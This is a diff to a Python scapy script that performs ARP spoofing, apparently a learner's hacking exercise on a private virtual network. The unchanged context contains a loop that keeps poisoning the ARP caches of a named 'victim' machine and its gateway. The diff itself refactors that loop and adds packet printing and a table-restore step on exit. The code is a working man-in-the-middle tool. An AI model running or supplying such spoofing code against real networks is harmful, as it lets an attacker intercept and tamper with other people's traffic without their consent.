@@ -29,8 +29,8 @@ def getMac(ip):
 # target_mac = "00:1c:42:83:95:fc" = victim_mac
 # spoof_ip = "10.211.55.1" = ap_ip
 
-# 1. Hacker change mac address of default gateway ==> spoof
-# 2.
+# 1. Hacker change mac address of default gateway ==> spoof() send to victim
+# 2. Hacker get Mac address of victim ==> restore() send to AP
 
 
 def spoof(target_ip, spoof_ip):
@@ -44,15 +44,19 @@ def restore(destination_ip, source_ip):
     source_mac = getMac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip,
                        hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+    print(packet.show())
+    print(packet.summary())
+    scapy.send(packet, count=4, verbose=False)
 
 
 # true is prevent change mac address of default gateway
+target_ip = "10.211.55.4"
+gateway_ip = "10.211.55.1"
 try:
     sendPacketsCount = 0
     while True:
-        spoof("10.211.55.4", "10.211.55.1")
-        spoof("10.211.55.1", "10.211.55.4")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         sendPacketsCount = sendPacketsCount + 2
         # \r bỏ in theo dòng và ngang
         # end = "" ==> quit ctrl + c
@@ -61,4 +65,6 @@ try:
         # sys.stdout.flush()
         time.sleep(2)
 except KeyboardInterrupt:
-    print("[+] Detected CTRL + C ... Quitting.")
+    print("[+] Detected CTRL + C ... Reseting ARP table ... Please wait .\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
